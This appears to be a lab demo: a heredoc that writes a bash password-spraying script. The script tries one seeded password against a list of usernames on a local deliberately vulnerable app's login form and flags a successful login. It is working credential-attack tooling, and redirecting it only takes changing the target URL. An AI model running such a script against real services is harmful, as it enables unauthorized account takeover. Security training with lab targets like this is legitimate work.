cat > demo_spray.sh <<'SH'
#!/usr/bin/env bash
# demo_spray.sh - tries a single password across users against local fake DVNA

BASE="http://localhost:3000"
URL="$BASE/login"
userfield="username"
passfield="password"
PASSWORD="secret123"         # edit if you change the seeded password in server.py
USERS_FILE="./users.txt"
OUT="/tmp/dvna_resp.txt"
THROTTLE=1                   # seconds between requests (demo-safe)

if [ ! -f "$USERS_FILE" ]; then
  echo "users.txt not found in $(pwd). Create it and add usernames (one per line)."
  exit 1
fi

echo "[*] Spray demo -> '$PASSWORD' across $(wc -l < "$USERS_FILE") users"

while IFS= read -r user || [ -n "$user" ]; do
  [ -z "$user" ] && continue
  echo -n "[*] Trying $user : $PASSWORD ... "

  httpcode=$(curl -s -o "$OUT" -w "%{http_code}" -X POST "$URL" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "$userfield=$user" \
    --data-urlencode "$passfield=$PASSWORD")

  if grep -qi "Welcome" "$OUT"; then
    echo "POSSIBLE SUCCESS -> $user : $PASSWORD (http=$httpcode)"
    sed -n '1,20p' "$OUT"
    break
  else
    len=$(wc -c < "$OUT" | tr -d ' ')
    echo "failed (len=$len http=$httpcode)"
  fi

  sleep $THROTTLE
done < "$USERS_FILE"

echo "[*] Done"
SH
